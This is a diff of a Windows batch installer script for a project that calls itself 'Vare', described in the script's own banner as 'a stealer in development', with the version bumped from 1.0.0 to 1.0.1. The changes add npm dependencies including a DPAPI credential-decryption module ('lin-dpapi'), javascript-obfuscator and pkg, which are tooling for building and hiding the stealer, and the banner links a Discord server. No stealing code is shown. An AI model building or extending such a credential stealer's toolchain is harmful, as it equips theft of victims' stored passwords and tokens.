@@ -54,10 +54,11 @@ echo.
 echo                                                     Installer Started
 echo.
 CHCP 437 > nul
+call npm install nan
 call npm install .
 call npm install node-gyp
 call npm install -g pkg
-call npm install vareapi
+call npm install lin-dpapi
 call npm install javascript-obfuscator
 call npm rebuild
 chcp 65001  > nul
@@ -101,7 +102,7 @@ echo.
 echo.
 echo                                                        Vare On Top
 echo                                              Vare is a stealer in development
-echo                                               Your Stealer Version is 1.0.0
+echo                                               Your Stealer Version is 1.0.1
 echo.
 echo.
 echo                                           Discord : https://discord.gg/5rPsGGgcMf
